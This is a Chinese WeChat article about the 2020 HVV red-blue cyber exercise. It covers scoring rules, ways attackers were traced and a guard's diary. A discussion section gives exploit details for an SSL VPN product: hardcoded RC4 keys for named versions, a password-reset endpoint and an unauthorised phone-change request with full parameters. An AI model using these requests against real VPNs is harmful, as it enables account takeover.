\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/y4uEQblEImjVdF8ZiXDh2A)

### **蓝军出击**

恰好最近电视剧热播《蓝军出击》，对应到 Hvv 行动，那么也抛出一个类似问题：“如果今天网络战争爆发, 这仗谁来防? 这仗谁来打? 谁能胜?”

红蓝对抗双方一般都是从 9 月 10 号投入现场战斗，经过长达 8 天的较量，策略、战术、利器、0day、手段的对抗，最终会沦为体力和心态的对抗。所以谁能保持良好的心态和可持续的体力投入，谁有大概率胜出。

### **平静与较量**

今年蓝队采取的 IP 情报共享封禁措施还是很有效果，这导致红队总体攻击迟缓、出货不明显，因此据悉红方得分规则发生变化，突破非目标系统但属于重要系统也可以获得最高分。  

蓝队溯源规则：完整还原攻击链条，溯源到黑客的虚拟身份、真实身份，溯源到攻击队员，反控攻击方主机根据程度阶梯给分，后面也进行了确认调整，必须红队攻击成功后的溯源反制才有效，否则初期会被驳回。

### **溯源与反制**

既然是对抗，我们甲方上层都那么重视，蓝队可不能都是厂商卖平台送的值守实习生等等，值守的都是大量扫描告警的产品，当类似 APT 检测产品上面全是海量普通的扫描攻击记录，产品名称是时候得再三斟酌了。

蓝队的老鸟也要进行研判分析及溯源反制: 流量分析，日志审计，溯源反制，背调研判，社工库查询，蜜罐诱捕 ，当然更重要的是安全圈子询问（圈子太小）。

![](https://mmbiz.qpic.cn/mmbiz_png/cib2MN4TF52JQUWOOicRgWiaITGXpULNqcpN4MrSsic3Nkkcy3ejHow7TFy5A4g7QX6ticM8yjdr3Ofgy5NhYG35kicw/640?wx_fmt=png)

截止目前攻击队因为安全意识问题被溯源的情况有大抵如下几种：  

1、使用个人工作 PC，且浏览器里面保存了 Baidu、163、Sina 等登陆凭据，攻击对抗过程中踩到蓝队蜜罐，被 JsonP 劫持漏洞捕获安全社交 id，从而被溯源到真实姓名和所在公司。

2、可能是蓝方封禁 IP 太厉害的原因，红队个人或团队，使用自己的网站 vps 进行扫描，vps 上含有团伙组织 HTTPS 证书、或 VPS IP 绑定的域名跟安全社交 id 对应，从而被溯源到真实姓名和所在公司。

3、部分攻击队写的扫描器 payload 里面含有攻击者信息，如使用了私有 DNSlog、攻击载荷里面含有安全社交 id、含有个人博客资源请求等。

4、投递的钓鱼邮件内木马样本被蓝队采集、逆向、反控 C2C、溯源到个人信息。

5、虚拟机逃逸打到实体机，暴露个人全部真实信息的。

### **推演和未来**

这场较量的真实意义就在于，贴近当今实战，面向未来网络战防御；不专业的红队这几天陆续被溯源反制，且也看到逐步整改，双方都应不断复盘和反思。

接下来几天相关未公开漏洞继续会被公开（或已公开漏洞被重视），红队会通过另类攻击手段达成积分获取。

策略、战术、利器、0day、情报、手段的对抗，最终还是体力和心态的对抗，谁能保持良好的心态和可持续的体力投入，谁有大概率胜出。

另外常态化地网络安全实战攻防演练，必将导致人才饥荒、人才培养机制改革以及安全服务运营模式的改革，高质量的安全人才非常重要，没质量的不应该太过浮躁。

渗了个透 发起了一个读者讨论 快来关注神秘的安全秘辛, 带你探索不一样的网络安全 精选讨论内容

1、某服 SSL VPN 任意密码重置

某 VPN 加密算法使用了默认的 key, 攻击者构利用 key 构造重置密码数据包从而修改任意用户的密码

利用: 需要登录账号

M7.6.6R1 版本 key 为 20181118

M7.6.1key 为 20100720

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7RnicWfk4JiaruBSA23WyxHxrEf1OQdZg73UckckRBnxoRrc67QxhhOnW7mQjN8u0FrACyOCiaJQmicCA/640?wx_fmt=png)

https://<PATH>/por/changepwd.csp

sessReq=clusterd&sessid=0&str=RC4\_STR&len=RC4\_STR\_LEN(脚本计算后结果)

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7RnicWfk4JiaruBSA23WyxHxrCNDSEZqtrX1YKHYK3slSIO8zIvjre8yCNdUwefsReibP79Vu5ibG1srg/640?wx_fmt=png)

2、某服 SSL VPN 修改任意账户手机号

修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码

利用: 需要登录账号

https://<PATH>/por/changetelnum.csp?apiversion=1

newtel=TARGET\_PHONE&sessReq=clusterd&username=TARGET\_USERNAME&grpid=0&sessid=0&ip=127.0.0.1

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7RnicWfk4JiaruBSA23WyxHxr2rIeoUCx7Ro91scA68nhG8JXBXmbar9DZOdPGJBicJZID7SEc2l55GQ/640?wx_fmt=png)

0day 预警:

Yii2 框架反序列化 RCE CVE-2020-15148

Apache Superset 远程命令执行 CVE-2020-13948

2020 年 9 月 17 日 星期四 大雨

今天 8 点就匆匆到客户现场值班，整个上午只监测到来自阿三的僵尸网络流量，下午有传闻说 xx 多家单位出局了。晚上，零食和晚餐都没有了。我知道，客户的 hw 结束了，这是不幸还是幸运呢。

刚刚接到通知，公司又把我分配到另一个客户那里，希望明天有我的早餐吧。

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7Q2ia7NeMEAKDJI38ldeK5vC2Ykcg7OALf4nQue9aLgK8Hgsqlo4gPaG7dViadosEIO637BMzAsia1jw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/gEVuGz7Ip7Q2ia7NeMEAKDJI38ldeK5vClsMt7tiaa2QuJNAia4ibmaevEr0GRe4nKyPIYLZsj2GzegtsMpmibL8ibnA/640?wx_fmt=gif)